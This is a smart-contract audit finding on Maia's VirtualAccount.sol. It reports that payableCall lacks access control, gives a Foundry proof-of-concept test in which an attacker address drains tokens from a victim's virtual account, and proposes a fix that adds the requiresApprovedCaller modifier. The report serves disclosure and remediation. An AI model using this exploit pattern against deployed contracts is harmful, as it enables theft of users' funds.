# Lines of code

https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L84-L112
https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L160-L167


# Vulnerability details

## Impact
The Virtual Account contract enables users to oversee assets and engage in remote interactions, all the while affording dApps encapsulated user balances for
accounting purposes. Amongst the critical functions within this contract lies the `payableCall` function, which offers the abilitiy to aggregate arbitrary calls
carrying a `msg.value` for the Virtual Account to execute. The absence of access control in `payableCall` exposes the funds and privileges controlled by the Virtual
Account to any malicious payload.

## Proof of Concept
This is the 'payableCall' function's implementation:

https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L84-L112
```c++
    function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {
        uint256 valAccumulator;
        uint256 length = calls.length;
        returnData = new bytes[](length);
        PayableCall calldata _call;
        for (uint256 i = 0; i < length;) {
            _call = calls[i];
            uint256 val = _call.value;
            // Humanity will be a Type V Kardashev Civilization before this overflows - andreas
            // ~ 10^25 Wei in existence << ~ 10^76 size uint fits in a uint256
            unchecked {
                valAccumulator += val;
            }

            bool success;
            // @audit NO ACCESS CONTROL to this point
            if (isContract(_call.target)) (success, returnData[i]) = _call.target.call{value: val}(_call.callData); // <--- ARBITRARY CALL

            if (!success) revert CallFailed();

            unchecked {
                ++i;
            }
        }

        // Finally, make sure the msg.value = SUM(call[0...i].value)
        if (msg.value != valAccumulator) revert CallFailed();
    }
```

And this is the modifier that, unlike `payableCall`, the `call` function employs in this same contract:

https://github.com/code-423n4/2023-09-maia/blob/f5ba4de628836b2a29f9b5fff59499690008c463/src/VirtualAccount.sol#L160-L167
```c++
    modifier requiresApprovedCaller() {
        if (!IRootPort(localPortAddress).isRouterApproved(this, msg.sender)) {
            if (msg.sender != userAddress) {
                revert UnauthorizedCaller();
            }
        }
        _;
    }
```

We can easily implement a Proof-of-Concept by creating a file (e.g. `PayableCallAuditTest.t.sol`) within the project's
directory at `./test/ulysses-omnichain/` with the following content:

```c++
//SPDX-License-Identifier: AGPL-3.0-only
pragma solidity ^0.8.16;

// Import `MulticallRootRouterTest` and extend it with the test contract to make setup easier
import "./MulticallRootRouterTest.t.sol";

// Structs and interface without imports for better visibility here
struct Call {
    address target;
    bytes callData;
}

struct PayableCall {
    address target;
    bytes callData;
    uint256 value;
}

interface IVirtualAccount {
    function call(Call[] calldata callInput) external returns (bytes[] memory);
    function payableCall(PayableCall[] calldata calls) external payable returns (bytes[] memory);
}

contract VirtualAccountAuditTest is MulticallRootRouterTest {
    function testPayableCallAccessControl() public {
        // Addresses
        address user = address(0xdeadbeef);
        address virtualAccount = address(rootPort.fetchVirtualAccount(user));
        address attacker = address(0x1337);

        // Ensure there are assets for PoC
        hevm.startPrank(address(rootPort));
        ERC20hTokenRoot(avaxGlobalToken).mint(address(virtualAccount), 9 ether, avaxChainId);
        hevm.stopPrank();

        // Prepare a dangerous call
        Call[] memory calls = new Call[](1);
        calls[0] = Call({
            target: avaxGlobalToken,
            callData: abi.encodeWithSignature("transfer(address,uint256)", attacker, 9 ether)
       });

        // Prepare a dangerous payableCall
        PayableCall[] memory payableCalls = new PayableCall[](1);
        payableCalls[0] = PayableCall({
            target: avaxGlobalToken,
            callData: abi.encodeWithSignature("transfer(address,uint256)", attacker, 9 ether),
            value: 0
       });

        // Check balances before the exploit
        assertEq(MockERC20(avaxGlobalToken).balanceOf(virtualAccount), 9 ether);
        assertEq(MockERC20(avaxGlobalToken).balanceOf(attacker), 0);

        /*//////////////////////////////////////////////////////////////
                                EXPLOIT
        //////////////////////////////////////////////////////////////*/
        hevm.startPrank(attacker);

        // First, let's try to use the `call` function for comparison
        hevm.expectRevert(bytes4(0x5c427cd9)); // UnauthorizedCaller()
        IVirtualAccount(virtualAccount).call(calls);
        // As expected, it REVERTS when called by the attacker

        // Now, with the `payableCall` function
        IVirtualAccount(virtualAccount).payableCall(payableCalls);

        hevm.stopPrank();

        // Check balances after the exploit; `attacker` now has 9 `ether` of `avaxGlobalToken`
        assertEq(MockERC20(avaxGlobalToken).balanceOf(virtualAccount), 0);
        assertEq(MockERC20(avaxGlobalToken).balanceOf(attacker), 9 ether);
    }
}
```

The explanation of the Proof-of-Concept is embedded within its comments, making it more seamlessly comprehensible and easy to follow.
To execute this test, you can run:

```bash
$ forge test --match-test testPayableCallAccessControl
```

## Tools Used

Manual: code editor, Foundry's `forge`.

## Recommended Mitigation Steps

### 1. Implement the Existent `requiresApprovedCaller` Modifier in the `payableCall` Function

You can employ the following code `diff` to make the recommended changes:

```diff
85c85
<     function payableCall(PayableCall[] calldata calls) public payable returns (bytes[] memory returnData) {
---
>     function payableCall(PayableCall[] calldata calls) public payable requiresApprovedCaller returns (bytes[] memory returnData) {
```

### 2. Test

This alteration will result in the failure of the test mentioned earlier. Should the existing test, including its import and
organization, be deemed appropriate for inclusion in the test harness, rectifying this issue is straightforward with the following modification:

```diff
65a66
>         hevm.expectRevert(bytes4(0x5c427cd9)); // UnauthorizedCaller()
71,72c72,73
<         assertEq(MockERC20(avaxGlobalToken).balanceOf(virtualAccount), 0);
<         assertEq(MockERC20(avaxGlobalToken).balanceOf(attacker), 9 ether);
---
>         assertEq(MockERC20(avaxGlobalToken).balanceOf(virtualAccount), 9 ether);
>         assertEq(MockERC20(avaxGlobalToken).balanceOf(attacker), 0);
```

Now, you can run the test successfully once more:

```bash
$ forge test --match-test testPayableCallAccessControl
```



